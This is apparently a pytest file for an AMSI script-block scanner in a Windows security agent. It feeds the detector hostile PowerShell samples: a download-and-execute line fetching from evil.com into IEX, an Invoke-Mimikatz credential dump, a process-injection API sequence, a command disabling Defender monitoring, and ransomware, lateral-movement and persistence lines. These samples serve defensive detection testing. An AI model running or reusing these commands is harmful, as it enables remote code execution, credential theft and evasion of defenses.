"""
Tests for the AMSI Scanner.

Covers pattern matching, severity mapping, snippet extraction,
and scanner properties. Does NOT require Windows — tests the
analysis logic directly.
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.config import AgentConfig, Severity
from scanners.amsi_scanner import AMSIScanner, AMSI_PATTERNS


class TestAMSIPatternMatching:
    """Test AMSI pattern analysis on script blocks."""

    def _analyze(self, content: str):
        config = AgentConfig()
        scanner = AMSIScanner(config)
        block = {"content": content, "record_id": "1", "timestamp": "", "path": ""}
        return scanner._analyze_script_block(block)

    def test_credential_dump_detected(self):
        findings = self._analyze("Invoke-Mimikatz -DumpCreds")
        assert len(findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in findings)
        assert any("credential" in f.evidence.get("rule_name", "") for f in findings)

    def test_download_execute_detected(self):
        findings = self._analyze(
            "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') | IEX"
        )
        assert len(findings) >= 1
        assert any("download_execute" in f.evidence.get("rule_name", "") for f in findings)

    def test_process_injection_detected(self):
        findings = self._analyze(
            "$addr = VirtualAllocEx($proc, 0, $size, 0x3000, 0x40)\n"
            "WriteProcessMemory($proc, $addr, $buf, $size, 0)\n"
            "CreateRemoteThread($proc, 0, 0, $addr, 0, 0, 0)"
        )
        assert len(findings) >= 1
        assert any(f.severity == Severity.CRITICAL for f in findings)

    def test_defense_evasion_detected(self):
        findings = self._analyze(
            "Set-MpPreference -DisableRealtimeMonitoring $true"
        )
        assert len(findings) >= 1
        assert any("defense_evasion" in f.evidence.get("rule_name", "") for f in findings)

    def test_ransomware_detected(self):
        findings = self._analyze(
            "$aes = [System.Security.Cryptography.Aes]::Create()\n"
            "foreach ($file in Get-ChildItem) { encrypt $file }\n"
            "Your files have been encrypted"
        )
        assert len(findings) >= 1
        assert any("ransomware" in f.evidence.get("rule_name", "") for f in findings)

    def test_clean_script_no_findings(self):
        findings = self._analyze("Get-Process | Format-Table Name, CPU")
        assert len(findings) == 0

    def test_lateral_movement_detected(self):
        findings = self._analyze(
            "Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }"
        )
        assert len(findings) >= 1
        assert any("lateral_movement" in f.evidence.get("rule_name", "") for f in findings)

    def test_persistence_detected(self):
        findings = self._analyze(
            "Register-ScheduledTask -TaskName 'Updater' -Action $action -Trigger $trigger"
        )
        assert len(findings) >= 1


class TestAMSIScannerProperties:
    """Test scanner metadata and properties."""

    def test_scanner_name(self):
        config = AgentConfig()
        scanner = AMSIScanner(config)
        assert scanner.name == "AMSIScanner"

    def test_windows_only(self):
        config = AgentConfig()
        scanner = AMSIScanner(config)
        assert scanner.supported_platforms == ["windows"]

    def test_get_info(self):
        config = AgentConfig()
        scanner = AMSIScanner(config)
        info = scanner.get_info()
        assert info["rule_count"] == len(AMSI_PATTERNS)
        assert info["pattern_count"] > 0


class TestSnippetExtraction:
    """Test context snippet extraction."""

    def test_snippet_around_match(self):
        content = "x" * 100 + "Invoke-Mimikatz" + "y" * 100
        snippet = AMSIScanner._extract_snippet(content, r"invoke-mimikatz")
        assert "invoke-mimikatz" in snippet.lower()
        assert len(snippet) <= 220  # ~200 + ellipsis

    def test_snippet_at_start(self):
        content = "Invoke-Mimikatz rest of script..."
        snippet = AMSIScanner._extract_snippet(content, r"invoke-mimikatz")
        assert snippet.startswith("Invoke")

    def test_snippet_no_match(self):
        content = "clean script content here"
        snippet = AMSIScanner._extract_snippet(content, r"nonexistent")
        assert snippet == content[:200]


class TestAMSIPatternsComplete:
    """Verify all pattern rules are valid."""

    def test_all_rules_have_required_fields(self):
        for rule in AMSI_PATTERNS:
            assert "name" in rule, f"Rule missing name"
            assert "patterns" in rule, f"Rule {rule.get('name')} missing patterns"
            assert "severity" in rule, f"Rule {rule.get('name')} missing severity"
            assert "description" in rule, f"Rule {rule.get('name')} missing description"
            assert "mitre" in rule, f"Rule {rule.get('name')} missing mitre"
            assert len(rule["patterns"]) > 0, f"Rule {rule.get('name')} has no patterns"

    def test_rule_count(self):
        assert len(AMSI_PATTERNS) >= 10
